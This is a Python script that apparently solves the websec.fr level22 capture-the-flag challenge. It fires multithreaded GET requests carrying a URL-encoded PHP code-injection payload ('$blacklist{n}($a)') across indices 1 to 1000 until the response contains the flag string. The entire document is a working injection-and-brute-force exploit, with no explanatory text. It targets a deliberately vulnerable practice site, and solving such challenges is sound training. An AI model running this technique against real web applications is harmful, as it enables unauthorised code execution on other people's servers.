```python
import threading  
import requests  
  
BASE_URL = "http://websec.fr/level22/index.php?code=%24blacklist%7B{n}%7D%28%24a%29"  
  
THREADS = 10  
MAX_N = 1000  
CHUNK = MAX_N // THREADS  
  
  
def worker(start, end):  
    for n in range(start, end + 1):  
        url = BASE_URL.format(n=n)  
        try:  
            resp = requests.get(url, timeout=5)  
        except Exception as e:  
            print(f"[{start}-{end}] network error for {n}: {e}")  
            continue  
  
        if "WEBSEC" in resp.text:  
            print(f"\n=== FOUND at index {n} ===\n")  
            print(resp.text)  
            return  
        else:  
            print(f"[{start}-{end}] checked {n}")  
  
  
def main():  
    threads = []  
  
    for i in range(THREADS):  
        start = i * CHUNK + 1  
        end = (i + 1) * CHUNK  
        if i == THREADS - 1:  
            end = MAX_N  # ensure full coverage  
  
        t = threading.Thread(target=worker, args=(start, end))  
        threads.append(t)  
        t.start()  
  
    for t in threads:  
        t.join()  
  
  
if __name__ == "__main__":  
    main()
```
